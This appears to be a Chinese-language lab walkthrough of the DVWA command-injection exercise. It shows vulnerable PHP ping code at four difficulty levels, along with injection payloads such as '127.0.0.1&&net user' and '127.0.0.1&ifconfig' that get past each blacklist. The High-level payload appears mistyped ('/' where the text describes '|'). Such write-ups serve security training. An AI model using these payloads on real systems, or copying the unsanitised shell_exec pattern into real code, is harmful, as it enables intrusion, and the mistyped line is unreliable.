<h1 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h1><pre><code>&lt;?php

if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
    // Get input
    $target = $_REQUEST[ &apos;ip&apos; ];

    // Determine OS and execute the ping command.
    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
        // Windows
        $cmd = shell_exec( &apos;ping  &apos; . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );
    }

    // Feedback for the end user
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
}

?&gt; </code></pre><p>审计代码发现，ip参数没有经过任何过滤，可以通过&amp;来进行多命令注入</p>
<pre><code>127.0.0.1&amp;&amp;net user（windows与linux）
127.0.0.1;ls /etc/
还有很多可以造成危害的操作，就不一一列举了</code></pre><h1 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h1><pre><code>&lt;?php

if( isset( $_POST[ &apos;Submit&apos; ]  ) ) {
    // Get input
    $target = $_REQUEST[ &apos;ip&apos; ];

    // Set blacklist
    $substitutions = array(
        &apos;&amp;&amp;&apos; =&gt; &apos;&apos;,
        &apos;;&apos;  =&gt; &apos;&apos;,
    );

    // Remove any of the charactars in the array (blacklist).
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );

    // Determine OS and execute the ping command.
    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) {
        // Windows
        $cmd = shell_exec( &apos;ping  &apos; . $target );
    }
    else {
        // *nix
        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target );
    }

    // Feedback for the end user
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
}

?&gt; </code></pre><p>可以看到中级过滤掉了一次&amp;&amp;和；但是&amp;并没有过滤，同样我们可以通过&amp;；&amp;来构造多命令注入</p>
<p>A&amp;&amp;B:A执行成功后执行B，否则不执行B；</p>
<p>A&amp;B:先执行A后执行B，不管执行成功与否；</p>
<pre><code>127.0.0.1&amp;ifconfig
127.0.0.1&amp;;&amp;ifconfig</code></pre><h1 id="High"><a href="#High" class="headerlink" title="High"></a>High</h1><pre><code>
&lt;?php 

if( isset( $_POST[ &apos;Submit&apos; ]  ) ) { 
    // Get input 
    $target = trim($_REQUEST[ &apos;ip&apos; ]); 

    // Set blacklist 
    $substitutions = array( 
        &apos;&amp;&apos;  =&gt; &apos;&apos;, 
        &apos;;&apos;  =&gt; &apos;&apos;, 
        &apos;| &apos; =&gt; &apos;&apos;, 
        &apos;-&apos;  =&gt; &apos;&apos;, 
        &apos;$&apos;  =&gt; &apos;&apos;, 
        &apos;(&apos;  =&gt; &apos;&apos;, 
        &apos;)&apos;  =&gt; &apos;&apos;, 
        &apos;`&apos;  =&gt; &apos;&apos;, 
        &apos;||&apos; =&gt; &apos;&apos;, 
    ); 

    // Remove any of the charactars in the array (blacklist). 
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); 

    // Determine OS and execute the ping command. 
    if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { 
        // Windows 
        $cmd = shell_exec( &apos;ping  &apos; . $target ); 
    } 
    else { 
        // *nix 
        $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); 
    } 

    // Feedback for the end user 
    echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
} 

?&gt;</code></pre><p>这次过滤了更多的参数，但我们发现过滤的是’| ‘而不是’|’,因此可以通过|来构造多命令注入</p>
<p>A|B:管道符，将A的输出作为B的输入，并且只打印B的结果。</p>
<pre><code>127.0.0.1/ls /etc</code></pre><h1 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h1><pre><code>&lt;?php 

if( isset( $_POST[ &apos;Submit&apos; ]  ) ) { 
    // Check Anti-CSRF token 
    checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); 

    // Get input 
    $target = $_REQUEST[ &apos;ip&apos; ]; 
    $target = stripslashes( $target ); 

    // Split the IP into 4 octects 
    $octet = explode( &quot;.&quot;, $target ); 

    // Check IF each octet is an integer 
    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) { 
        // If all 4 octets are int&apos;s put the IP back together. 
        $target = $octet[0] . &apos;.&apos; . $octet[1] . &apos;.&apos; . $octet[2] . &apos;.&apos; . $octet[3]; 

        // Determine OS and execute the ping command. 
        if( stristr( php_uname( &apos;s&apos; ), &apos;Windows NT&apos; ) ) { 
            // Windows 
            $cmd = shell_exec( &apos;ping  &apos; . $target ); 
        } 
        else { 
            // *nix 
            $cmd = shell_exec( &apos;ping  -c 4 &apos; . $target ); 
        } 

        // Feedback for the end user 
        echo &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;; 
    } 
    else { 
        // Ops. Let the user name theres a mistake 
        echo &apos;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&apos;; 
    } 
} 

// Generate Anti-CSRF token 
generateSessionToken(); 

?&gt; </code></pre><p>严格限制为输入类型为 number.number.number.number</p>
<p>无法执行命令注入</p>
